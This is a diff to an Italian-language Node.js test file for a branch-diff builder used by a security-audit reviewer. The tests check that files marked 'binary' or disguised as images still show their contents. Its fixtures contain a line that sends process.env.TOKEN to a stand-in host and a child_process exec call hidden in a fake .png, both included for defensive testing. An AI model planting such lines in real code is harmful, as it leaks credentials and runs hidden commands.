@@ -58,6 +58,7 @@ const {
   perimetroNote,
   serverCtx,
   diffForBranch,
+  vociRaw,
   withRetry,
   emit,
   preflight,
@@ -704,7 +705,7 @@ test('emit secaudit: un diff grosso va intero in un file fuori dal repo, e il te
   assert.ok(fuoriDa(repo, j.payload.diffFile), 'il file sta fuori dal repo');
   assert.equal(readFileSync(j.payload.diffFile, 'utf8'), diff, 'il file contiene tutto il diff');
   assert.deepEqual(j.payload.diffBase, base);
-  assert.equal(j.payload.diffComando, `git diff ${'a'.repeat(40)}...${'b'.repeat(40)}`);
+  assert.equal(j.payload.diffComando, `git diff --text --no-textconv ${'a'.repeat(40)}...${'b'.repeat(40)}`);
 });
 
 test('emit verifier: col testo vero del ruolo, una storia normale e le decisioni corte la stampa resta sotto la soglia', () => {
@@ -923,6 +924,62 @@ test('diffForBranch: un diff vuoto passa solo se il contenuto del ramo è davver
   assert.equal(j.payload.diffCaratteri, 0);
   assert.match(j.instructions, /diffVuoto/, 'il testo del ruolo dice cosa farne');
   assert.equal(buildPayload(bucket, serverCtx(bucket, null, diffForBranch('worker/vero', repo))).diffVuoto, undefined);
+});
+
+test('diffForBranch: un attributo del ramo non rende opaco un file; fuori restano solo i media binari, elencati (#1502)', () => {
+  const repo = resolve(TMP, 'repo-diff-testo');
+  mkdirSync(resolve(repo, 'src'), { recursive: true });
+  const g = (...a) => execFileSync('git', ['-c', 'user.email=t@t', '-c', 'user.name=t', '-c', 'core.autocrlf=false', ...a], { cwd: repo, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
+  const metti = (f, b) => { mkdirSync(dirname(resolve(repo, f)), { recursive: true }); writeFileSync(resolve(repo, f), b); };
+  g('init', '-q', '--initial-branch=main');
+  metti('src/guardia.js', 'export const ok = true;\n');
+  g('add', '-A'); g('commit', '-q', '-m', 'base');
+  g('update-ref', 'refs/remotes/origin/main', g('rev-parse', 'HEAD'));
+  g('checkout', '-q', '-b', 'worker/opaco');
+  metti('.gitattributes', 'src/guardia.js binary\n');
+  metti('src/guardia.js', 'export const ok = true;\nfetch("https://esempio.invalid/" + process.env.TOKEN);\n');
+  metti('src/dati/tabella.dat', Buffer.from('riga\u0000nascosta\n'));
+  metti("assets/icone/logo con 'apice'.png", Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x00, 0x00, 0x00, 0x0d]));
+  metti('assets/icone/finto.png', 'require("child_process").exec("x");\n');
+  g('add', '-A'); g('commit', '-q', '-m', 'lavoro');
+
+  const r = diffForBranch('worker/opaco', repo);
+  assert.equal(r.ok, true, r.motivo);
+  assert.match(execFileSync('git', ['diff', `${r.base.sha}...${r.head}`], { cwd: repo, encoding: 'utf8' }), /Binary files[^\n]*guardia\.js/,
+    'premessa: col diff di serie il file marcato binario si vede solo per nome');
+  assert.match(r.diff, /\+fetch\("https:\/\/esempio\.invalid\/"/, 'il contenuto del file reso opaco c\'è');
+  assert.match(r.diff, /\+src\/guardia\.js binary/, 'e c\'è l\'attributo che lo rendeva opaco');
+  assert.match(r.diff, /riga\u0000nascosta/, 'un binario fuori dai media resta nel diff, come testo');
+  assert.match(r.diff, /\+require\("child_process"\)/, 'un «media» senza NUL è testo, e si legge');
+  assert.doesNotMatch(r.diff, /logo con/, 'un media binario davvero non riempie il diff di byte illeggibili');
+  assert.deepEqual(r.media, [{ file: "assets/icone/logo con 'apice'.png", stato: 'A', byte: 8 }]);
+  assert.deepEqual(r.binari, [{ file: 'src/dati/tabella.dat', stato: 'A', byte: 14 }]);
+  assert.equal(execFileSync('bash', ['-c', r.comando], { cwd: repo, encoding: 'utf8' }), r.diff, 'il comando dichiarato riproduce il diff');
+
+  const bucket = { role: 'secaudit', id: 's', num: '#1502', branch: 'worker/opaco' };
+  const p = buildPayload(bucket, serverCtx(bucket, null, r));
+  assert.equal(p.diffComando, r.comando);
+  assert.deepEqual([p.diffMedia, p.diffBinari], [r.media, r.binari]);
+
+  // Un ramo che cambia solo un'immagine: il diff di testo è vuoto, e il perché lo dice.
+  g('checkout', '-q', 'main');
+  g('checkout', '-q', '-b', 'worker/icona');
+  metti('assets/icone/nuova.png', Buffer.from([0x89, 0x00, 0x01]));
+  g('add', '-A'); g('commit', '-q', '-m', 'icona');
+  const icona = diffForBranch('worker/icona', repo);
+  assert.deepEqual([icona.ok, icona.diff, icona.vuoto], [true, '', { commitPropri: 1, soloMedia: 1 }]);
+  assert.match(buildPayload(bucket, serverCtx(bucket, null, icona)).diffVuoto, /solo un file multimediale[^]*diffMedia/);
+});
+
+test('vociRaw: file, stato e blob da guardare; il blob vecchio per un file tolto, nessuno per un sottomodulo', () => {
+  const z = '0'.repeat(40);
+  const [a, b] = ['a'.repeat(40), 'b'.repeat(40)];
+  const out = [`:000000 100644 ${z} ${b} A`, 'nuovo.js', `:100644 000000 ${a} ${z} D`, 'tolto.png',
+    `:100644 100644 ${a} ${b} M`, 'con spazio.js', `:000000 160000 ${z} ${b} A`, 'vendor/sub', ''].join('\0');
+  assert.deepEqual(vociRaw(out), [
+    { file: 'nuovo.js', stato: 'A', sha: b }, { file: 'tolto.png', stato: 'D', sha: a },
+    { file: 'con spazio.js', stato: 'M', sha: b }, { file: 'vendor/sub', stato: 'A', sha: '' },
+  ]);
 });
 
 // ─── teardown ─────────────────────────────────────────────────────────────────
